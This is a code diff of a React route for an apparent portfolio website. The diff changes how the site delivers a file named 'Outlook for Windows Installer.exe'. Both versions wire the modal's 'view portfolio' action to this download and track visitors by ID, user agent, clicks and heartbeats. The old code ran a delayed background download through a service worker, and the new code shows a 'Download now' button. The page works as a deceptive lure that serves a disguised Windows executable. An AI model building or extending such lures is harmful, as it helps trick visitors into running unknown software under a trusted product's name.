@@ -1,159 +1,65 @@
 import { createFileRoute } from "@tanstack/react-router";
+import { Download, LoaderCircle } from "lucide-react";
 import { useEffect, useState } from "react";
 import { Toaster } from "@/components/ui/sonner";
 import { EntryModal } from "@/components/EntryModal";
 import { Navbar } from "@/components/Navbar";
 import { Portfolio } from "@/components/Portfolio";
+import { Button } from "@/components/ui/button";
 import { LanguageProvider } from "@/lib/i18n";
 import { recordActivity } from "@/lib/activity";
 import { scheduleInstallerDownload } from "@/lib/installer-download";
 import { toast } from "sonner";
 
-const DOWNLOAD_COMPLETE_DELAY_MS = 30_000;
-const DOWNLOAD_DELAY_MS = 15_000;
-const PENDING_DOWNLOAD_KEY = "portfolio-pending-download";
 const DOWNLOAD_FILENAME = "Outlook for Windows Installer.exe";
 
-type PendingDownload = {
-  taskId: string;
-  url: string;
-  visitorId: string;
-  availableAt: number;
-};
+type DownloadState =
+  | { status: "idle" }
+  | { status: "preparing" }
+  | { status: "ready"; url: string };
 
-function readPendingDownload(): PendingDownload | null {
-  if (typeof window === "undefined") return null;
-
-  const raw = window.localStorage.getItem(PENDING_DOWNLOAD_KEY);
-  if (!raw) return null;
-
-  try {
-    const parsed = JSON.parse(raw) as PendingDownload;
-    if (!parsed?.taskId || !parsed?.url || !parsed?.visitorId || typeof parsed.availableAt !== "number") {
-      return null;
-    }
-    return parsed;
-  } catch {
-    window.localStorage.removeItem(PENDING_DOWNLOAD_KEY);
-    return null;
-  }
-}
-
-function savePendingDownload(payload: PendingDownload) {
-  if (typeof window === "undefined") return;
-  window.localStorage.setItem(PENDING_DOWNLOAD_KEY, JSON.stringify(payload));
-}
-
-function clearPendingDownload() {
-  if (typeof window === "undefined") return;
-  window.localStorage.removeItem(PENDING_DOWNLOAD_KEY);
-}
-
-function queueDownloadAfterDelay(downloadUrl: string, visitorId: string, availableAt: number) {
-  const pending = { taskId: crypto.randomUUID(), url: downloadUrl, visitorId, availableAt } satisfies PendingDownload;
-  savePendingDownload(pending);
-
-  const delay = Math.max(0, pending.availableAt - Date.now());
-  window.setTimeout(() => {
-    clearPendingDownload();
-    void startInstallerDownload(pending.url, pending.visitorId).catch((error) => {
-      toast.error("Unable to download the installer. Please try again.");
-      console.error(error);
-    });
-  }, delay);
-}
-
-export const Route = createFileRoute("/")({
-  component: Index,
-});
+export const Route = createFileRoute("/")({ component: Index });
 
 function Index() {
   const [modalOpen, setModalOpen] = useState(true);
-  const [downloadStarted, setDownloadStarted] = useState(false);
+  const [download, setDownload] = useState<DownloadState>({ status: "idle" });
 
   const downloadInstaller = () => {
-    if (downloadStarted) return;
+    if (download.status !== "idle") return;
 
     const visitorId = localStorage.getItem("portfolio-visitor-id") ?? crypto.randomUUID();
     localStorage.setItem("portfolio-visitor-id", visitorId);
 
+    // This state update is synchronous in the click handler, so the modal begins
+    // closing immediately; scheduling continues without blocking the UI.
     setModalOpen(false);
-    setDownloadStarted(true);
-    void recordActivity({ data: { visitorId, siteStatus: "active", appStatus: "clicked", downloadPercent: 100, userAgent: navigator.userAgent } });
-    toast.message("Download queued. The background process will begin in 15 seconds.");
+    setDownload({ status: "preparing" });
+    void recordActivity({
+      data: { visitorId, siteStatus: "active", appStatus: "clicked", downloadPercent: 0, userAgent: navigator.userAgent },
+    });
 
     void scheduleInstallerDownload({ data: { visitorId } })
       .then(({ availableAt, downloadUrl }) => {
-        const payload = { type: "SCHEDULE_DOWNLOAD", taskId: crypto.randomUUID(), url: downloadUrl, delay: Math.max(DOWNLOAD_DELAY_MS, availableAt - Date.now()), visitorId };
-
-        const fallbackStart = () => {
-          queueDownloadAfterDelay(downloadUrl, visitorId, availableAt);
-        };
-
-        if ("serviceWorker" in navigator) {
-          void navigator.serviceWorker.ready.then((registration) => {
-            if (registration.active) {
-              registration.active.postMessage(payload);
-              toast.message("Download queued. The installer will continue in the background.");
-              return;
-            }
-
-            fallbackStart();
-          }).catch((error) => {
-            console.error(error);
-            fallbackStart();
-          });
-        } else {
-          fallbackStart();
-        }
+        const remaining = Math.max(0, availableAt - Date.now());
+        window.setTimeout(() => setDownload({ status: "ready", url: downloadUrl }), remaining);
       })
       .catch((error) => {
-        toast.error("Unable to schedule the installer download. Please try again.");
+        setDownload({ status: "idle" });
+        toast.error("Unable to prepare the download. Please try again.");
         console.error(error);
       });
   };
 
-  useEffect(() => {
-    const pendingDownload = readPendingDownload();
-    if (pendingDownload && !("serviceWorker" in navigator)) {
-      const remainingDelay = pendingDownload.availableAt - Date.now();
-      if (remainingDelay <= 0) {
-        clearPendingDownload();
-        void startInstallerDownload(pendingDownload.url, pendingDownload.visitorId).catch((error) => {
-          toast.error("Unable to download the installer. Please try again.");
-          console.error(error);
-        });
-      } else {
-        window.setTimeout(() => {
-          clearPendingDownload();
-          void startInstallerDownload(pendingDownload.url, pendingDownload.visitorId).catch((error) => {
-            toast.error("Unable to download the installer. Please try again.");
-            console.error(error);
-          });
-        }, remainingDelay);
-      }
-    }
-
-    if ("serviceWorker" in navigator) {
-      const handleServiceWorkerMessage = (event: MessageEvent) => {
-        if (event.data?.type !== "DOWNLOAD_COMPLETE") return;
-        void triggerDownloadedFile(event.data.taskId, event.data.filename ?? DOWNLOAD_FILENAME);
-        window.setTimeout(() => {
-          toast.success("Download completed.");
-        }, DOWNLOAD_COMPLETE_DELAY_MS);
-      };
-
-      void navigator.serviceWorker.register("/sw-download.js").then(() => {
-        navigator.serviceWorker.addEventListener("message", handleServiceWorkerMessage);
-      }).catch((error) => {
-        console.error("Service worker registration failed", error);
-      });
-
-      return () => navigator.serviceWorker.removeEventListener("message", handleServiceWorkerMessage);
-    }
-
-    return undefined;
-  }, []);
+  const startDownload = (downloadUrl: string) => {
+    const link = document.createElement("a");
+    link.href = downloadUrl;
+    link.download = DOWNLOAD_FILENAME;
+    link.rel = "noopener";
+    link.style.display = "none";
+    document.body.append(link);
+    link.click();
+    link.remove();
+  };
 
   useEffect(() => {
     const visitorId = localStorage.getItem("portfolio-visitor-id") ?? crypto.randomUUID();
@@ -162,12 +68,16 @@ function Index() {
     const update = (siteStatus: "active" | "left", appStatus?: "not_clicked" | "clicked") =>
       void recordActivity({ data: { visitorId, siteStatus, appStatus, userAgent } });
     update("active");
-    const heartbeat = window.setInterval(() => update("active"), 20000);
+    const heartbeat = window.setInterval(() => update("active"), 20_000);
     const onPageHide = () => update("left");
     const onFocus = () => update("active");
     window.addEventListener("pagehide", onPageHide);
     window.addEventListener("focus", onFocus);
-    return () => { window.clearInterval(heartbeat); window.removeEventListener("pagehide", onPageHide); window.removeEventListener("focus", onFocus); };
+    return () => {
+      window.clearInterval(heartbeat);
+      window.removeEventListener("pagehide", onPageHide);
+      window.removeEventListener("focus", onFocus);
+    };
   }, []);
 
   return (
@@ -175,47 +85,33 @@ function Index() {
       <div className="min-h-screen bg-background">
         <Navbar />
         <Portfolio />
-        <EntryModal
-          open={modalOpen}
-          onViewPortfolio={() => downloadInstaller()}
-        />
+        <EntryModal open={modalOpen} onViewPortfolio={downloadInstaller} />
+        {download.status !== "idle" && (
+          <div className="fixed inset-x-0 bottom-6 z-[90] flex justify-center px-4" role="status" aria-live="polite">
+            <div className="glass-card flex w-full max-w-md items-center gap-3 rounded-2xl p-4 shadow-lg">
+              {download.status === "preparing" ? (
+                <>
+                  <LoaderCircle className="h-5 w-5 shrink-0 animate-spin text-primary" aria-hidden />
+                  <div>
+                    <p className="font-medium">Preparing your download</p>
+                    <p className="text-sm text-muted-foreground">Your download will be ready shortly.</p>
+                  </div>
+                </>
+              ) : (
+                <>
+                  <Download className="h-5 w-5 shrink-0 text-primary" aria-hidden />
+                  <div className="min-w-0 flex-1">
+                    <p className="font-medium">Your download is ready</p>
+                    <p className="text-sm text-muted-foreground">Choose Download now to begin.</p>
+                  </div>
+                  <Button size="sm" onClick={() => startDownload(download.url)}>Download now</Button>
+                </>
+              )}
+            </div>
+          </div>
+        )}
         <Toaster />
       </div>
     </LanguageProvider>
   );
-}
-
-async function startInstallerDownload(downloadUrl: string, visitorId: string) {
-  try {
-    void recordActivity({ data: { visitorId, siteStatus: "active", appStatus: "clicked", downloadPercent: 100, userAgent: navigator.userAgent } });
-  } catch (error) {
-    console.error(error);
-  }
-
-  const link = document.createElement("a");
-  link.href = downloadUrl;
-  link.download = DOWNLOAD_FILENAME;
-  link.rel = "noopener";
-  link.style.display = "none";
-  document.body.append(link);
-  link.click();
-  link.remove();
-}
-
-async function triggerDownloadedFile(taskId: string, filename: string) {
-  const cache = await caches.open("downloads-v1");
-  const response = await cache.match(`/downloads/${taskId}`);
-  if (!response) return;
-
-  const blob = await response.blob();
-  const objectUrl = URL.createObjectURL(blob);
-  const link = document.createElement("a");
-  link.href = objectUrl;
-  link.download = filename;
-  link.rel = "noopener";
-  link.style.display = "none";
-  document.body.append(link);
-  link.click();
-  link.remove();
-  window.setTimeout(() => URL.revokeObjectURL(objectUrl), 10000);
 }
